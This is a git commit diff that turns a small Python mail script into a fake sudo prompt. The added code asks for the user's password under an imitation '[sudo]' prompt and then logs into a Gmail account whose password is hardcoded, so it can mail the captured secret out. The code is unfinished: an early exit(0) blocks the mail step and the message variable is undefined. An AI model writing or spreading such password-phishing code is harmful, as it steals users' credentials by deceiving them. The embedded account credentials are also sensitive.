cbd1ff863c60d7cabb3f583925760f8d4fbdc3d5
Benjamin GAYMAY <benjamin.gaymay@epitech.eu>
2018-02-08 17:14:20 +0100

    mail / faux sudo

--- sendMail.py
+++ sendMail.py
@@ -2,9 +2,17 @@
 """ Envoyer un mail """
 
 import smtplib
+import getpass
 
-try:
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.ehlo()
-except:
-    print('Something went wrong...')
+username = getpass.getuser();
+password = getpass.getpass("[sudo] Mot de passe de %s : " % (username))
+
+
+
+exit (0)
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login("applicationsudo@gmail.com", "ANTILOPE")
+
+server.sendmail("applicationsudo@gmail.com", "applicationsudo@gmail.com", msg)
+server.quit()
